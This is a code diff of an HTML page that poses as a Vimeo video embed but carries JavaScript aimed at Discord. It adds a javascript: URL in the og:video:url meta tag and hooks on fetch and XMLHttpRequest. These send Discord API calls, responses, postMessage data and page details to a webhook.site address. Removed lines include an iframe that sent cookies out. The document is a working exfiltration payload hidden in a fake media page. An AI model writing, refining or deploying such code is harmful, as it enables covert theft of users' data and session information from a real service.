@@ -4,7 +4,7 @@
     <meta property="og:site_name" content="Vimeo">
     <meta property="og:type" content="video.other">
     <meta property="og:image" content="https://i.vimeocdn.com/video/test/maxresdefault.jpg">
-    <meta property="og:video:url" content="https://player.vimeo.com/video/123456789/login/private?success=javascript:void(fetch('/api/v9/science').then(r=>r.text()).then(t=>fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?type=science&data='+encodeURIComponent(t))))">
+    <meta property="og:video:url" content="https://player.vimeo.com/video/123456789/login/private?success=javascript:void(fetch('https://discord.com/api/v9/science').then(r=>r.text()).then(t=>fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?type=science&data='+encodeURIComponent(t))))">
     <meta property="og:video:secure_url" content="https://player.vimeo.com/video/123456789?player_id=vimeo-player&amp;api=1&amp;callback=initVimeoPlayer">
     <meta property="og:video:type" content="text/html">
     <meta property="og:video:width" content="1280">
@@ -16,7 +16,7 @@
             const config = {
                 type: 'media-source',
                 video: {
-                    contentType: 'video/mp4;codecs="avc1.42E01E,mp4a.40.2"',
+                    contentType: 'video/mp4',
                     width: 1920,
                     height: 1080,
                     bitrate: 120000,
@@ -25,76 +25,73 @@
             };
             
             const result = await navigator.mediaCapabilities.decodingInfo(config);
-            console.log('Media capabilities:', result);
             
-            // Try to access Discord's MessageQueue
-            if (window.MessageQueue) {
-                fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        type: 'messagequeue',
-                        data: window.MessageQueue
-                    })
-                });
-            }
+            // Monitor Discord API endpoints we saw in logs
+            const targetEndpoints = [
+                '/api/v9/channels/',
+                '/api/v9/science',
+                'sentry.abc0129c539b29bedc5b.js'
+            ];
             
-            // Attempt to intercept Discord API calls
+            // Attempt to access Discord's message queue system
+            const queueCheck = setInterval(() => {
+                if (window.MessageQueue || window.__SENTRY__) {
+                    fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
+                        method: 'POST',
+                        body: JSON.stringify({
+                            type: 'discord_objects',
+                            messageQueue: window.MessageQueue ? true : false,
+                            sentry: window.__SENTRY__ ? true : false,
+                            location: window.location.href
+                        })
+                    });
+                    clearInterval(queueCheck);
+                }
+            }, 1000);
+            
+            // Intercept Discord API calls
             const originalFetch = window.fetch;
             window.fetch = function(url, options) {
-                if (url.includes('discord.com/api')) {
+                if (targetEndpoints.some(endpoint => url.includes(endpoint))) {
                     fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                         method: 'POST',
                         body: JSON.stringify({
                             type: 'api_intercept',
                             url: url,
-                            options: options
+                            options: options,
+                            timestamp: new Date().toISOString()
                         })
                     });
                 }
                 return originalFetch.apply(this, arguments);
             };
+
+            // Try to inject into Discord's XHR
+            const originalXHR = window.XMLHttpRequest.prototype.open;
+            window.XMLHttpRequest.prototype.open = function(method, url, ...args) {
+                if (targetEndpoints.some(endpoint => url.includes(endpoint))) {
+                    fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
+                        method: 'POST',
+                        body: JSON.stringify({
+                            type: 'xhr_intercept',
+                            method: method,
+                            url: url,
+                            timestamp: new Date().toISOString()
+                        })
+                    });
+                }
+                return originalXHR.apply(this, [method, url, ...args]);
+            };
+
         } catch(e) {
-            console.error('Media exploit failed:', e);
             fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                 method: 'POST',
                 body: JSON.stringify({
                     type: 'error',
-                    error: e.toString()
+                    error: e.toString(),
+                    stack: e.stack
                 })
             });
-        }
-    }
-
-    function initVimeoPlayer(player_id) {
-        try {
-            // Attempt to inject into Discord's message queue
-            const iframe = document.createElement('iframe');
-            iframe.srcdoc = `
-                <script>
-                    fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
-                        method: 'POST',
-                        body: JSON.stringify({
-                            type: 'iframe_loaded',
-                            cookies: document.cookie,
-                            location: window.location.href
-                        })
-                    });
-                <\/script>
-            `;
-            document.body.appendChild(iframe);
-            
-            // Try to access Discord's Sentry instance
-            if (window.__SENTRY__) {
-                fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        type: 'sentry_found',
-                        data: window.__SENTRY__
-                    })
-                });
-            }
-        } catch(e) {
-            console.error('Player init error:', e);
         }
     }
 
@@ -102,15 +99,15 @@
     
     // Listen for postMessage responses
     window.addEventListener('message', function(event) {
-        if (event.data) {
-            fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
-                method: 'POST',
-                body: JSON.stringify({
-                    type: 'postMessage',
-                    data: event.data
-                })
-            });
-        }
+        fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
+            method: 'POST',
+            body: JSON.stringify({
+                type: 'postMessage',
+                data: event.data,
+                origin: event.origin,
+                timestamp: new Date().toISOString()
+            })
+        });
     });
     </script>
 </head>
